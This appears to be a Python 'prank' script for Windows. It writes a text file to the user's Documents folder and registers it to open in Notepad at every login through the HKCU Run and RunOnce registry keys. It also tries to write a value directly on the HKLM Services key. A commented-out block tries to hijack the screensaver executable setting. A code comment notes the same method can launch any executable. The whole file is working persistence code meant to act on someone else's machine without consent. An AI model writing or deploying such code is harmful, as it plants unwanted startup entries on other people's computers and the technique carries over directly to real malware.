import winreg as reg
import os

def create_file():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    file_path = os.path.join(documents_path, "prank.txt")
    with open(file_path, "w") as file:
        file.write("You've been pranked")
    # print(file_path)

def add_to_startup():
    hkcu_keys = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
    hklm_keys = [r"SYSTEM\CurrentControlSet\Services"]
    value_name = "GetPranked"
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    text_file_path = os.path.join(documents_path, "prank.txt")
    file_path = r"notepad.exe " + text_file_path  # Opens a file with Notepad - can run any executable (I think)
    
    for key in hkcu_keys:
        try:
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
        except PermissionError:
            print("failed", key)
            pass
    for key in hklm_keys:
        try:
            with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
        except PermissionError:
            print("failed", key)
            pass

    # Attempt to set a file to run when the screensaver activates -- didn't work
    '''
    with reg.OpenKey(reg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, reg.KEY_SET_VALUE) as key:
        reg.SetValueEx(key, "SCRNSAVE.EXE", 0, reg.REG_SZ, file_path) # Set SCRNSAVE.EXE to another executable
        reg.SetValueEx(key, "ScreenSaveActive", 0, reg.REG_SZ, "1") # Activate screensaver (1 = active)
        reg.SetValueEx(key, "ScreenSaveTimeOut", 0, reg.REG_SZ, "15")  # Set activation timeout to 60 seconds
    '''

if __name__ == "__main__":
    create_file()
    add_to_startup()